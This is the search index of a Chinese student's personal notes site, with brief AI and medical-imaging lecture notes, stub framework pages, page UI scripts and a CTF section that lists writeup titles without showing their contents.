{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f \u00b6 \u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a21 \u603b\u5b57\u6570\uff1a8400 \u4ee3\u7801\u5757\u884c\u6570\uff1a1090 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"#_1","text":"\u8fd9\u91cc\u662f\u5495\u5495\u5495\uff08Jimmy\uff09\u7684\u7a7a\u767d\u7b14\u8bb0\u672c! :) orz \u6700\u8fd1\u66f4\u65b0 / \u670b\u53cb\u4eec! / \u7ad9\u70b9\u7edf\u8ba1 \u9875\u9762\u603b\u6570\uff1a21 \u603b\u5b57\u6570\uff1a8400 \u4ee3\u7801\u5757\u884c\u6570\uff1a1090 \u7f51\u7ad9\u8fd0\u884c\u65f6\u95f4\uff1a function updateTime() { var date = new Date(); var now = date.getTime(); var startDate = new Date(\"2023/10/26 10:59:00\"); var start = startDate.getTime(); var diff = now - start; var y, d, h, m; y = Math.floor(diff / (365 * 24 * 3600 * 1000)); diff -= y * 365 * 24 * 3600 * 1000; d = Math.floor(diff / (24 * 3600 * 1000)); h = Math.floor(diff / (3600 * 1000) % 24); m = Math.floor(diff / (60 * 1000) % 60); if (y == 0) { document.getElementById(\"web-time\").innerHTML = d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } else { document.getElementById(\"web-time\").innerHTML = y + \"<span class=\\\"heti-spacing\\\"> </span>\u5e74<span class=\\\"heti-spacing\\\"> </span>\" + d + \"<span class=\\\"heti-spacing\\\"> </span>\u5929<span class=\\\"heti-spacing\\\"> </span>\" + h + \"<span class=\\\"heti-spacing\\\"> </span>\u5c0f\u65f6<span class=\\\"heti-spacing\\\"> </span>\" + m + \"<span class=\\\"heti-spacing\\\"> </span>\u5206\u949f\"; } setTimeout(updateTime, 1000 * 60); } updateTime(); function toggle_statistics() { var statistics = document.getElementById(\"statistics\"); if (statistics.style.opacity == 0) { statistics.style.opacity = 1; } else { statistics.style.opacity = 0; } }","title":"\u8fd9\u91cc\u4e00\u7247\u8352\u829c\uff0c\u5bf8\u8349\u4e0d\u751f"},{"location":"changelog/","text":"\u66f4\u65b0\u8bb0\u5f55 \u00b6 Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u6539\u52a8\u8bb0\u5f55 PS\uff1a\u8fd9\u4e2a\u529f\u80fd\u7528\u7684\u662fTony\u4f6c\u7684\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6 TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; } 2023 \u00b6 2023-10-26 \u00b6 ZJUCTF 2023 Writeup 2023-10-25 \u00b6 \u4f7f\u7528TonyCrane Toolchain\u5b8c\u6210\u4e86\u521d\u6b65note\u7684\u90e8\u7f72","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#_1","text":"Abstract \u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e9bnote\u6539\u52a8\u8bb0\u5f55 PS\uff1a\u8fd9\u4e2a\u529f\u80fd\u7528\u7684\u662fTony\u4f6c\u7684\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6 TonyCrane/mkdocs-changelog-plugin .md-typeset h2 { margin-top: 0em; }","title":"\u66f4\u65b0\u8bb0\u5f55"},{"location":"changelog/#2023","text":"2023-10-26 \u00b6 ZJUCTF 2023 Writeup 2023-10-25 \u00b6 \u4f7f\u7528TonyCrane Toolchain\u5b8c\u6210\u4e86\u521d\u6b65note\u7684\u90e8\u7f72","title":"2023"},{"location":"links/","text":"\u53cb\u94fe \u00b6 Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"links/#_1","text":"Abstract \u4e00\u4e9b\u5927\u4f6c\u4eec\u7684\u7b14\u8bb0\u672corz \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c Tony\u8001\u5e08\uff01\uff01\uff01","title":"\u53cb\u94fe"},{"location":"todo/","text":"note\u8ba1\u5212 \u00b6 \u7ea6 28 \u4e2a\u5b57 \u5efa\u7ad9\u76f8\u5173 \u00b6 [] \u4f7f\u7528TonyCrane-toolchain\u642d\u5efa [] \u6839\u636e\u81ea\u5df1\u9700\u6c42\u505a\u51fa\u81ea\u5b9a\u4e49 \u7b14\u8bb0\u76f8\u5173 \u00b6 [] loading...","title":"ToDo"},{"location":"todo/#note","text":"\u7ea6 28 \u4e2a\u5b57","title":"note\u8ba1\u5212"},{"location":"todo/#_1","text":"[] \u4f7f\u7528TonyCrane-toolchain\u642d\u5efa [] \u6839\u636e\u81ea\u5df1\u9700\u6c42\u505a\u51fa\u81ea\u5b9a\u4e49","title":"\u5efa\u7ad9\u76f8\u5173"},{"location":"todo/#_2","text":"[] loading...","title":"\u7b14\u8bb0\u76f8\u5173"},{"location":"ai/","text":"Artificial Intelligence \u00b6 \u7ea6 21 \u4e2a\u5b57 Abtract AI \u76f8\u5173 Courses AI & Medical Image 343 1 mins 1730258309 Other Pytorch 20 0 mins 1699268877 Tensorflow 20 0 mins 1699268877 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Artificial Intelligence"},{"location":"ai/#artificial-intelligence","text":"\u7ea6 21 \u4e2a\u5b57 Abtract AI \u76f8\u5173 Courses AI & Medical Image 343 1 mins 1730258309 Other Pytorch 20 0 mins 1699268877 Tensorflow 20 0 mins 1699268877 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Artificial Intelligence"},{"location":"ai/pytorch/","text":"Pytorch \u00b6 \u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bPytorch\u6846\u67b6\u7684\u57fa\u7840","title":"PyTorch"},{"location":"ai/pytorch/#pytorch","text":"\u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bPytorch\u6846\u67b6\u7684\u57fa\u7840","title":"Pytorch"},{"location":"ai/tensorflow/","text":"Tensorflow \u00b6 \u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bTensorflow\u6846\u67b6\u7684\u57fa\u7840","title":"Tensorflow"},{"location":"ai/tensorflow/#tensorflow","text":"\u7ea6 16 \u4e2a\u5b57 Abstract \u4e3b\u8981\u5b66\u4e60\u4ecb\u7ecd\u4e00\u4e0bTensorflow\u6846\u67b6\u7684\u57fa\u7840","title":"Tensorflow"},{"location":"ai/courses/","text":"Courses \u00b6","title":"Courses"},{"location":"ai/courses/#courses","text":"","title":"Courses"},{"location":"ai/courses/ai_med/","text":"\u4eba\u5de5\u667a\u80fd\u4e0e\u533b\u5b66\u56fe\u50cf\u5206\u6790 \u00b6 \u7ea6 339 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f Abstract A HARDCORE(FAKE) course of Dr.Zhao. Lesson 1 \u00b6 \u4e34\u5e8a\u95ee\u9898 \u00b6 \u4e3b\u8981\u4efb\u52a1\u5206\u7c7b\uff1a \u8bca\u65ad \u5b9a\u4f4d \u5206\u5272 \u751f\u6210 \u9884\u6d4b \u4eba\u5de5\u667a\u80fd \u00b6 \u5982\u4f55\u8bc4\u5224\u4e00\u5f20\u533b\u5b66\u56fe\u50cf\u7684\u597d\u574f \u91d1\u6807\u51c6 \uff1a\u533b\u751f\u4e3b\u89c2\u5224\u65ad \u4f20\u7edf\u7279\u5f81\u5de5\u7a0b\uff08\u91cf\u5316\u6307\u6807\uff09\uff1a \u8fb9\u7f18\u6e05\u6670 \u5bf9\u6bd4\u5ea6\u9ad8 \u4fe1\u566a\u6bd4\u9ad8 \u6ca1\u6709\u8fd0\u52a8\u4f2a\u5f71 ... \u673a\u5668\u5b66\u4e60\u672c\u8d28\u662f\u5f52\u7eb3 \u6837\u672c\u5206\u5e03 \u53ef\u89e3\u91ca\u6027\uff1a\u4f20\u7edf\u7279\u5f81\u5de5\u7a0b\u4e0e\u4eba\u5de5\u667a\u80fd\u7684\u533a\u522b \uff08\u8fd1\u51e0\u5e74\u6709\u5927\u91cf\u7684\u7814\u7a76\u6539\u5584\uff09 \u4ece\u4f4e\u7ef4\u5230\u9ad8\u7ef4\u7279\u5f81 \u00b6 \u4e3a\u4ec0\u4e48\u8981\u9ad8\u7ef4\u7279\u5f81 \u5c06\u975e\u7ebf\u6027\u95ee\u9898\u8f6c\u6362\u6210\u7ebf\u6027\u95ee\u9898\uff08\u7b80\u5355\u95ee\u9898\uff09 AI History (\u53ef\u7565\u8fc7) AI History \u00b6 \u8d1d\u53f6\u65af\u4f30\u8ba1 \u00b6 \u5148\u9a8c\u77e5\u8bc6\u5bf9\u7ed3\u679c\u5f71\u54cd\u5f88\u5927\uff08\u4e00\u4e2a\u4f8b\u5b50\uff09 $$ P(A|B) = \\frac{P(B|A)P(A)}{P(B)} $$ \u9a6c\u5c14\u53ef\u592b\u94fe \u00b6 \u7565 Neuron/Perception \u00b6 \u795e\u7ecf\u5143\u6a21\u578b\uff0c\u7565 $$ Y=A(Wx+b) $$ Alan Turing \u00b6 \u4fe1\u606f\u8bba initial seed\u7684\u91cd\u8981\u6027 Nearest Neighbor search \u00b6 \u805a\u7c7b\u548c\u5206\u7c7b\u95ee\u9898 K-Means SVM \u67d0\u4e9b\u4efb\u52a1\u91cc\uff0c\u4f20\u7edf\u7684\u673a\u5668\u5b66\u4e60\u4e5f\u4f1a\u4f18\u4e8e\u6df1\u5ea6\u5b66\u4e60 Multiple Layer Perception \u00b6 Forward Backward AI Winter \u00b6 \u7565 RNN \u00b6 \u7565 LeNeT \u00b6 1998 Convolution Neural Network LSTM \u00b6 \u7565 AlexNet \u00b6 ImgaeNet by LeeFeifei\uff0c\u7565 GAN \u00b6 2014 lan Goodfellow Transformer \u00b6 2017 Google Brain Attention Is All You Need Diffusion \u00b6 \u7565 Linear Algorithm \u00b6 \\[ Y=EX \\] Y is given If E is given, X is the target: image reconstruction If X is given, E is the target: machine learning Inner product \u00b6 \u5185\u79ef\u7684\u610f\u4e49\uff1a\u6295\u5f71 $$ x\u00b7y=|x||y|cos\\theta $$","title":"AI & Medical Image"},{"location":"ai/courses/ai_med/#_1","text":"\u7ea6 339 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f Abstract A HARDCORE(FAKE) course of Dr.Zhao.","title":"\u4eba\u5de5\u667a\u80fd\u4e0e\u533b\u5b66\u56fe\u50cf\u5206\u6790"},{"location":"ai/courses/ai_med/#lesson-1","text":"","title":"Lesson 1"},{"location":"ai/courses/ai_med/#_2","text":"\u4e3b\u8981\u4efb\u52a1\u5206\u7c7b\uff1a \u8bca\u65ad \u5b9a\u4f4d \u5206\u5272 \u751f\u6210 \u9884\u6d4b","title":"\u4e34\u5e8a\u95ee\u9898"},{"location":"ai/courses/ai_med/#_3","text":"\u5982\u4f55\u8bc4\u5224\u4e00\u5f20\u533b\u5b66\u56fe\u50cf\u7684\u597d\u574f \u91d1\u6807\u51c6 \uff1a\u533b\u751f\u4e3b\u89c2\u5224\u65ad \u4f20\u7edf\u7279\u5f81\u5de5\u7a0b\uff08\u91cf\u5316\u6307\u6807\uff09\uff1a \u8fb9\u7f18\u6e05\u6670 \u5bf9\u6bd4\u5ea6\u9ad8 \u4fe1\u566a\u6bd4\u9ad8 \u6ca1\u6709\u8fd0\u52a8\u4f2a\u5f71 ... \u673a\u5668\u5b66\u4e60\u672c\u8d28\u662f\u5f52\u7eb3 \u6837\u672c\u5206\u5e03 \u53ef\u89e3\u91ca\u6027\uff1a\u4f20\u7edf\u7279\u5f81\u5de5\u7a0b\u4e0e\u4eba\u5de5\u667a\u80fd\u7684\u533a\u522b \uff08\u8fd1\u51e0\u5e74\u6709\u5927\u91cf\u7684\u7814\u7a76\u6539\u5584\uff09","title":"\u4eba\u5de5\u667a\u80fd"},{"location":"ai/courses/ai_med/#_4","text":"\u4e3a\u4ec0\u4e48\u8981\u9ad8\u7ef4\u7279\u5f81 \u5c06\u975e\u7ebf\u6027\u95ee\u9898\u8f6c\u6362\u6210\u7ebf\u6027\u95ee\u9898\uff08\u7b80\u5355\u95ee\u9898\uff09 AI History (\u53ef\u7565\u8fc7)","title":"\u4ece\u4f4e\u7ef4\u5230\u9ad8\u7ef4\u7279\u5f81"},{"location":"ai/courses/ai_med/#ai-history","text":"","title":"AI History"},{"location":"ai/courses/ai_med/#_5","text":"\u5148\u9a8c\u77e5\u8bc6\u5bf9\u7ed3\u679c\u5f71\u54cd\u5f88\u5927\uff08\u4e00\u4e2a\u4f8b\u5b50\uff09 $$ P(A|B) = \\frac{P(B|A)P(A)}{P(B)} $$","title":"\u8d1d\u53f6\u65af\u4f30\u8ba1"},{"location":"ai/courses/ai_med/#_6","text":"\u7565","title":"\u9a6c\u5c14\u53ef\u592b\u94fe"},{"location":"ai/courses/ai_med/#neuronperception","text":"\u795e\u7ecf\u5143\u6a21\u578b\uff0c\u7565 $$ Y=A(Wx+b) $$","title":"Neuron/Perception"},{"location":"ai/courses/ai_med/#alan-turing","text":"\u4fe1\u606f\u8bba initial seed\u7684\u91cd\u8981\u6027","title":"Alan Turing"},{"location":"ai/courses/ai_med/#nearest-neighbor-search","text":"\u805a\u7c7b\u548c\u5206\u7c7b\u95ee\u9898 K-Means SVM \u67d0\u4e9b\u4efb\u52a1\u91cc\uff0c\u4f20\u7edf\u7684\u673a\u5668\u5b66\u4e60\u4e5f\u4f1a\u4f18\u4e8e\u6df1\u5ea6\u5b66\u4e60","title":"Nearest Neighbor search"},{"location":"ai/courses/ai_med/#multiple-layer-perception","text":"Forward Backward","title":"Multiple Layer Perception"},{"location":"ai/courses/ai_med/#ai-winter","text":"\u7565","title":"AI Winter"},{"location":"ai/courses/ai_med/#rnn","text":"\u7565","title":"RNN"},{"location":"ai/courses/ai_med/#lenet","text":"1998 Convolution Neural Network","title":"LeNeT"},{"location":"ai/courses/ai_med/#lstm","text":"\u7565","title":"LSTM"},{"location":"ai/courses/ai_med/#alexnet","text":"ImgaeNet by LeeFeifei\uff0c\u7565","title":"AlexNet"},{"location":"ai/courses/ai_med/#gan","text":"2014 lan Goodfellow","title":"GAN"},{"location":"ai/courses/ai_med/#transformer","text":"2017 Google Brain Attention Is All You Need","title":"Transformer"},{"location":"ai/courses/ai_med/#diffusion","text":"\u7565","title":"Diffusion"},{"location":"ai/courses/ai_med/#linear-algorithm","text":"\\[ Y=EX \\] Y is given If E is given, X is the target: image reconstruction If X is given, E is the target: machine learning","title":"Linear Algorithm"},{"location":"ai/courses/ai_med/#inner-product","text":"\u5185\u79ef\u7684\u610f\u4e49\uff1a\u6295\u5f71 $$ x\u00b7y=|x||y|cos\\theta $$","title":"Inner product"},{"location":"cs/","text":"","title":"Index"},{"location":"ctf/","text":"CTF \u00b6 Abstract CTF (Capture The Flag) \u662f\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u4e00\u79cd\u6bd4\u8d5b\u5f62\u5f0f\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u5bfb\u627e\u6f0f\u6d1e\u5e76\u5229\u7528\u7684\u65b9\u5f0f\u83b7\u53d6 flag\uff0c\u5176\u5305\u542b misc\u3001reverse\u3001pwn\u3001crypto\u3001web...\u591a\u79cd\u7c7b\u578b\u7684\u9898\u76ee\u3002\u4e3a\u4e86\u4fdd\u6301\u8fd9\u9879\u5174\u8da3\u7231\u597d\uff0c\u6211\u4f1a\u5728\u8fd9\u91cc\u5c1d\u8bd5\u8bb0\u5f55\u4e00\u4e9b\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\u548c\u4e00\u4e9b\u9898\u89e3qwq\u3002 Table of Contents \u00b6 misc Steganography \u9690\u5199\u672f 0 0 mins 0 Web todo 0 0 mins 1698334667 Others Writeups 7694 1090 39 mins 1739967330 Tools 1 0 mins 1698334667 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"CTF"},{"location":"ctf/#ctf","text":"Abstract CTF (Capture The Flag) \u662f\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u4e00\u79cd\u6bd4\u8d5b\u5f62\u5f0f\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u5bfb\u627e\u6f0f\u6d1e\u5e76\u5229\u7528\u7684\u65b9\u5f0f\u83b7\u53d6 flag\uff0c\u5176\u5305\u542b misc\u3001reverse\u3001pwn\u3001crypto\u3001web...\u591a\u79cd\u7c7b\u578b\u7684\u9898\u76ee\u3002\u4e3a\u4e86\u4fdd\u6301\u8fd9\u9879\u5174\u8da3\u7231\u597d\uff0c\u6211\u4f1a\u5728\u8fd9\u91cc\u5c1d\u8bd5\u8bb0\u5f55\u4e00\u4e9b\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\u548c\u4e00\u4e9b\u9898\u89e3qwq\u3002","title":"CTF"},{"location":"ctf/#table-of-contents","text":"misc Steganography \u9690\u5199\u672f 0 0 mins 0 Web todo 0 0 mins 1698334667 Others Writeups 7694 1090 39 mins 1739967330 Tools 1 0 mins 1698334667 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"ctf/misc/","text":"","title":"Index"},{"location":"ctf/tools/","text":"Tools \u00b6","title":"Tools"},{"location":"ctf/tools/#tools","text":"","title":"Tools"},{"location":"ctf/web/","text":"","title":"Index"},{"location":"ctf/writeups/","text":"Writeups \u00b6 Abstract \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5b66\u4e60\u6216\u8005\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u7684 writeup Table of Contents \u00b6 Learning Ethernaut 940 402 8 mins 1739967309 2023 \ud83d\udd12 ZJUCTF 2023 1090 4 mins \u4e0d\u516c\u5f00 Hackergame 2023 3153 222 13 mins 1739967309 2024 \ud83d\udd12 ZJUCTF 2024 1083 299 7 mins \u4e0d\u516c\u5f00 Hackergame 2024 1384 167 7 mins 1739967309 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Writeups"},{"location":"ctf/writeups/#writeups","text":"Abstract \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5b66\u4e60\u6216\u8005\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u7684 writeup","title":"Writeups"},{"location":"ctf/writeups/#table-of-contents","text":"Learning Ethernaut 940 402 8 mins 1739967309 2023 \ud83d\udd12 ZJUCTF 2023 1090 4 mins \u4e0d\u516c\u5f00 Hackergame 2023 3153 222 13 mins 1739967309 2024 \ud83d\udd12 ZJUCTF 2024 1083 299 7 mins \u4e0d\u516c\u5f00 Hackergame 2024 1384 167 7 mins 1739967309 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"ctf/writeups/ethernaut/","text":"Ethernaut \u00b6 Abstract \u611f\u89c9\u8fd9\u4e2a\u7cfb\u5217\u662fBlockchain\u6bd4\u8f83\u6709\u540d\u7684\u65b0\u624b\u9898\u76ee\u7cfb\u5217\uff0c\u5e0c\u671b\u80fd\u501f\u6b64\u5b66\u4f1a\u4e00\u4e9bBlockchain\u57fa\u7840\u6280\u80fd\uff0c\u4e0d\u81f3\u4e8e\u6bd4\u8d5b\u7684\u65f6\u5019\u65e0\u8111\u8df3\u8fc7\u3002 \u9898\u76ee\u94fe\u63a5 